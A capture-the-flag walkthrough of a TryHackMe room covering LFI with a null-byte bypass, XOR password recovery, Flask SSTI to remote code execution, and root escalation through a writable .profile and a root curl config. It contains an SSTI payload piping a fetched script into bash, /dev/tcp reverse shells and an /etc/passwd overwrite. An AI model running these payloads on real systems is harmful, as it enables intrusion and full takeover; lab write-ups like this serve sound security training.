# 81 - Super Secret TIp (LFI, XOR password encryption & decryption, SSTI RCE and bypass)

Room Link --> [https://tryhackme.com/room/supersecrettip](https://tryhackme.com/room/supersecrettip)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vvv -T4 10.10.161.135 -p- -sV

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
7777/tcp open  cbt?
```
{% endcode %}

There are 2 port open, first one is ssh and another one is called `cbt`, this service is usually for streaming online application. It just like a simple web port, connect to it and get the web page.

### Gobuster enumeration

{% code overflow="wrap" %}
```bash
ffuf -u http://10.10.161.135:7777/FUZZ -c -w /opt/wordlist.txt -t 500 --ic

cloud
debug
```
{% endcode %}

`/cloud`&#x20;

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*rYM-WM53yqqE2uFom7f3ug.png" alt="" height="237" width="700"><figcaption></figcaption></figure>

The `/debug` directory seems a debugger that can debug with our command but need the password. And here the command line have a `1337 * 1337` in the blank, this is pretty same like SSTI payload, this is maybe a hint, we can try it after we get the password. So we go to the /cloud directory and try to download the file. However not all the file can be downloaded.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*_3mpBDLt3xGQ5nCXUOnHmQ.png" alt="" height="512" width="700"><figcaption></figcaption></figure>

Some file can be downloaded but not useful, there is only one interesting file called `templates.py` .&#x20;

From here we can decide to FUZZ for other `.py` files using wfuzz.

> Here there is two download button but only the first one is working, so we can try to fuzz the first payload and find any other file can be downloaded.

{% code overflow="wrap" %}
```bash
wfuzz -u http://10.10.161.135:7777/cloud -c -X POST -d 'download=FUZZ.py&download=s' -w /opt/SecLists/Discovery/Web-Content/common.txt --hc 404

source
```
{% endcode %}

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

We got a hit. This means we can download another file called `source.py` in the `/cloud` directory.

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Source Code

{% code lineNumbers="true" %}
```python
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```
{% endcode %}

We can get lots of important information in it:

1. There is a file called `‘`**`supersecrettip.txt`**`’` in the same directory that we can download it.
2. This file import two other non-standard python file called **`ip.py`**(using in **`/debugresult`**) and **`debugpassword.py` .**
3. When using debugger, the `“`**`‘&;%`**`”` is the illegal character.
4. In the **`/cloud`** directory, there is only two kind of file can be downloaded, the first one is called `“`**`source.py`**`”`, another one is the file with `“`**`.txt`**`”` extension.
5. There is another directory called **`/debugresult`** . It seems use to get the feedback of the **`/debug`** page.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*ELNN8yUBl7kbWI7tOewEzQ.png" alt="" height="273" width="700"><figcaption><p>debugresult page</p></figcaption></figure>

We can go for those point one by one, first we try to down load the **`ip.py`** and **`debugpassword.py`** since those two file seems important. However, with the point 4, we can not download directly, so we can bypass using the "**NULLBYTE**" **`%00.txt`** . After that we get two python file.

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*GJQhBK0G6oaqeyglLjd8Tg.png" alt="" height="412" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*elCIHFcdNBdoDoiiVFm9iQ.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

```python
dking@dking ~/Downloads$ cat debugpassword.py                                                                  
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')

dking@dking ~/Downloads$ cat ip.py                                                                             
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip%  
```

The `ip` python file is means we need to add the `“X-Forwarded-For:”` when we use the `/debugresult` . The debugpassword python file is the code to encode the password. The follow the previous point 1, we can download the `supersecrettip.txt` .

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*YxcZ36Qt5YavAoUvO8K86g.png" alt="" height="335" width="700"><figcaption></figcaption></figure>

```
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

#### Python XOR

Combine them with the CyberChef, we can get the original password for debugger. We first use python to transform the encoded text into the hex format as we need to xor with the key `“`**`ayham`**`”` , then we use CyberChef.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*-dNIvn1K5Qp0oamJP2cuwg.png" alt="" height="124" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*fq4B6zCLN_DDEts44QcveQ.png" alt="" height="470" width="700"><figcaption></figcaption></figure>

Then we got out password: `AyhamDeebugg`  . We can try to use this password to run the debugger and put any command in it.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

and the password is correct and we were able to execute the debug statement.

now let's see in the source code how to see the result of that debug statement :

```python
@app.route("/debugresult", methods=["GET"])
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")

    if not session:
        return render_template("debugresult.html")

    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')

    if not debug and not user_password:
        return render_template("debugresult.html")

    # return render_template("debugresult.html", debug=debug, success=True)

    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```

#### SSTI

About [SSTI](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/18-Testing\_for\_Server\_Side\_Template\_Injection?source=post\_page-----2e15329f6d7b--------------------------------)

We first test the basic payload which is `{{3*3}}` . If the SSTI is exist, the feedback should be 9.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*NVEccgQqRowWFjfgBOxidg.png" alt="" height="314" width="700"><figcaption></figcaption></figure>

We go to the new directory called **/debugresult** and capture the package. Because with the `ip-check` function in `ip` python file, we need to add a `X-Forwarded-For` in the package like this.

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Let me use curl.

For this, we need a Session Cookie to pass to the GET request for the `/debugresult`&#x20;

```bash
dking@dking ~/Downloads$ curl "http://10.10.87.79:7777/debug?debug=7*7&password=AyhamDeebugg" -I          3 ↵  
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Mon, 20 Nov 2023 12:48:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJyrVkpJTSpNV7JSMtcyV9JRKkgsLi7PL0oBCiSpK8TEVBgYoBGqQNIwOSamCMQzBnEsQCwzECtVXakWAA61GWY.ZVtVkA.zDcBXmGRyuCfpMzzoMfhxCpMr_c; HttpOnly; Path=/
Connection: close
```

Now we have the Cookie we can pass it as `-b` cookie value.

{% code overflow="wrap" %}
```bash
curl http://10.10.87.79:7777/debugresult -b "session=.eJyrVkpJTSpNV7JSMtcyV9JRKkgsLi7PL0oBCiSpK8TEVBgYoBGqQNIwOSamCMQzBnEsQCwzECtVXakWAA61GWY.ZVtVkA.zDcBXmGRyuCfpMzzoMfhxCpMr_c" -H "X-Forwarded-For: 127.0.0.1"

# outputs.
┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
<span class="result">7*7</span>

</code>
</pre>

```
{% endcode %}

we finally got access to the debugResult page and we see that our input from the debug statement is reflected on the page, and since this is running flask, that makes it vulnerable to `Server Side Template Injection`, to confirm that, let's create another debug statement with the value `{{7*7}}`, and see if it will execute, if we get the output as `49`, we will know for sure that it's vulnerable.

{% hint style="success" %}
I notices the cookie changes for each request, so we must update the cookies for this to work.
{% endhint %}

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ curl "http://10.10.87.79:7777/debug?debug=\{\{7*7\}\}&password=AyhamDeebugg" -I   

# outputs    
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Mon, 20 Nov 2023 12:56:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJyrVkpJTSpNV7JSqq421zKvrVXSUSpILC4uzy9KAQomqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgCp1xtW.ZVtXdw.IQ2vDaLLrSEDadueBv-EyerIgCA; HttpOnly; Path=/
Connection: close

# we will use this cookie for the "/debugresult" page.
```
{% endcode %}

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ curl http://10.10.87.79:7777/debugresult -b "session=.eJyrVkpJTSpNV7JSqq421zKvrVXSUSpILC4uzy9KAQomqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgCp1xtW.ZVtXdw.IQ2vDaLLrSEDadueBv-EyerIgCA" -H "X-Forwarded-For: 127.0.0.1"

┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
<span class="result">49</span>

</code>
</pre>
```
{% endcode %}

we got `49`, that confirms that it's vulnerable to `ssti`, now let's get a reverse shell since we can execute commands with ssti.

### SSTI RCE

the payload i'll use for the reverse shell is :

{% code overflow="wrap" %}
```
{{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+10.18.88.214/exp.sh+|+bash").read()+}}
```
{% endcode %}

the reason for using this exact payload is cause it doesn't contain any of the illegal characters that are getting filtered here :

```python
def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error
```

Conetents of `exp.sh` .

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ cat exp.sh                                                                              
bash -i >& /dev/tcp/10.18.88.214/9000 0>&1
```
{% endcode %}

Setup python server to host the .sh file. Then execute.

{% code overflow="wrap" %}
```bash
# 1st to get the cookie.
dking@dking ~/Downloads$ curl 'http://10.10.87.79:7777/debug?debug=\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+10.18.88.214/exp.sh|bash").read()+\}\}&password=AyhamDeebugg' -I

# 2nd trigget the payload.
dking@dking ~/Downloads$ curl http://10.10.87.79:7777/debugresult -H "X-Forwarded-For: 127.0.0.1" -b 'session=.eJxdjdEKwiAYRl9FfohtEKYVIT2LILrZJtgU_40GtndP666bj3PgwJdhsGYd4Q45E7T-QZVys1uUKjD6YLTHL5vV-cXNP3HPGFJpWgkBJXQ0hmjnYv2aPOGMckGFoGd-PdktUpzeRuNUw2T10HZk3-EIUSO-QhrKuWmIlBtjf3Moy3spU7VLFVHpVsk2sH8AH6A-pA.ZVtcPg.UjYaapd1URh3skDvCXFaTyJvh0I'
```
{% endcode %}

### Initial Access

And we get a shell.

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to F30s

`cat /etc/crontab` - there is a job running as the `F30s` user every minute.

```bash
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

We ran `linpeas.sh`, and noticed something interesting in the output :

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/F30s/.profile
/home/ayham
/run/lock
/tmp
/tmp/linpeas.sh
/var/tmp
```

we see that we can write into the `/home/F30s/.profile` file.

the `.profile` file is executed whenever a user (`F30s` in this case) logs into their account, since we have write access to it let's add a reverse shell inside and wait hoping `F30s` will login and the profile file will get executed :

{% code overflow="wrap" %}
```bash
ayham@482cbf2305ae:/tmp$ echo 'bash -c "bash -i >& /dev/tcp/10.18.88.214/4444 0>&1"' >> /home/F30s/.profile
```
{% endcode %}

Setup nc listener to catch it.

And we got a shell  as `F30s` user.

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Root

i decided to run `pspy64` to see live running processes, and noticed an interesting process :

```plaintext
CMD: UID=0     PID=298    | /bin/sh -c    curl -K /home/F30s/site_check
```

so root is executing `curl -K /home/F30s/site_check`, let's check the site\_check file :

```plaintext
F30s@482cbf2305ae:~$ cat site_check
url = "http://127.0.0.1/health_check"
```

so this is a curl config file, basically instead of specifying arguments in the terminal, we can just add them to this config file, and we see that the url is `http://127.0.0.1/health_check`, i tried to access that but got no connection.

but since we can modify this file, we can modify the url to some file that we control and add another argument which is `output`, to right the content of the url to that output file.

let's first test this, so in my local machine, i create a simple text file and opened an http server :

```plaintext
└─$ echo 'ttttttttt' > test.txt

└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

then i modified the curl config file to :

```bash
url = "http://10.18.88.214/test.txt"
output = "/tmp/test.txt"
```

This is telling curl to request for `test.txt` file, and output it to the `/tmp` dir.

And we got a hit.

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

we see that the test.txt file is saved there by root, which means this works, and this gives us a chance to get root, basically we will attempt to overwrite the `passwd file` by adding a new user with root privileges inside.

so to do that we first copy the content of `/etc/passwd` file to our local machine, then we add new user with root privileges inside :

```bash
F30s@482cbf2305ae:~$ echo 'url = "file:///etc/passwd"' > site_check
echo 'url = "file:///etc/passwd"' > site_check
F30s@482cbf2305ae:~$ echo 'output = "/tmp/passwd"' >> site_check
echo 'output = "/tmp/passwd"' >> site_check
F30s@482cbf2305ae:~$ ls -al /tmp
ls -al /tmp
total 16
drwxrwxrwt 1 root  root  4096 Nov 20 14:06 .
drwxr-xr-x 1 root  root  4096 Jun 24 14:09 ..
prw-r--r-- 1 ayham ayham    0 Nov 20 13:15 f
-rw-r--r-- 1 root  root  1060 Nov 20 14:06 passwd
-rw-r--r-- 1 root  root    10 Nov 20 13:55 test.txt
```

This worked, we can see the `passwd` file saved to /tmp as root. Now we can modify it by adding a new user as root, then sening it back to the `/etc/passwd` position.

And we got a hit.

```
F30s@482cbf2305ae:~$ echo 'url = "http://10.18.88.214/passwd"' > site_check
echo 'url = "http://10.18.88.214/passwd"' > site_check
F30s@482cbf2305ae:~$ echo 'output = "/etc/passwd"' >> site_check
echo 'output = "/etc/passwd"' >> site_check
F30s@482cbf2305ae:~$ cat site_check
cat site_check
url = "http://10.18.88.214/passwd"
output = "/etc/passwd"
F30s@482cbf2305ae:~$ 
```

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We have a new user `dking` now.

```bash
F30s@482cbf2305ae:~$ su dking
su dking
id
uid=0(root) gid=0(root) groups=0(root)
/bin/bash -i
bash: cannot set terminal process group (1361): Inappropriate ioctl for device
bash: no job control in this shell
root@482cbf2305ae:/home/F30s# 
```

We are root now.

```bash
root@482cbf2305ae:~# ls -ak
ls -ak
.
..
.bashrc
.cache
.profile
.python_history
.wget-hsts
flag2.txt
secret.txt
root@482cbf2305ae:~# cat flag2.txt
cat flag2.txt
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
root@482cbf2305ae:~# 

```

The root.txt is encrypted.

{% code overflow="wrap" %}
```bash
root@482cbf2305ae:~# cat flag2.txt
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'

root@482cbf2305ae:~# cat secret.txt
cat secret.txt
b'C^_M@__DC\\7,'

```
{% endcode %}

Both files are encrypted, and we don't have any key.

we see that the flag is somehow encrypted again, and there is another file named `secret.txt` and that's also looks encrypted.

i tried to decrypt them using XOR and the key we found earlier but that didn't work.

after some time we notice this text file in `/` :

```bash
root@482cbf2305ae:/# ls -la
total 92
...
drwxr-xr-x   1 root root 4096 Jun 24 14:14 run
drwxr-xr-x   1 root root 4096 Nov 15  2022 sbin
-rw-r--r--   1 root root  629 May 19 12:28 secret-tip.txt
drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
dr-xr-xr-x  13 root root    0 Sep 24 14:33 sys
```

It seems a text with some words, so key should be one of those words, you can use the brute force to solve it, but I guess the key is **`root`** at first time and it is right :). Also before use the CyberChef you need to use the hex() function in python to transform the key in **`secret.txt`**.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Well again, the output **`1109200013XX`** is not the key of the **`flag2.txt`** . You need to test all the number from **`00–99`** of the last two digits. Here is the final answer, the right key is **`110920001386` .**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```
THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
```

We can use this script to decrypt the encrypted files.

{% code title="file.py" %}
```python
def xor_decrypt(ciphertext, key):
    decrypted = bytearray(len(ciphertext))
    for i in range(len(ciphertext)):
        decrypted[i] = ciphertext[i] ^ key[i % len(key)]
    return decrypted

def main():
    ciphertext = bytearray(b'C^_M@__DC\\7,')

    with open('wordlist.txt', 'r') as key_file:
        keys = [line.strip() for line in key_file]

    for key in keys:
        key_bytes = bytearray(key.encode())
        decrypted = xor_decrypt(ciphertext, key_bytes)

        if all(32 <= byte <= 126 for byte in decrypted):
            print(f"Key: '{key}', Decrypted Text: '{decrypted.decode()}'")

if __name__ == "__main__":
    main()

# to run 
python3 file.py

# output
Key: 'root', Decrypted Text: '1109200013XX'
```
{% endcode %}

Then for the `XX` missing values

```bash
#!/bin/bash

original_string="1109200013XX"

for num in {00..99}; do
    replaced_string="${original_string/XX/$num}"
    echo "$replaced_string"
done

# result.
110920001386
```

Done!

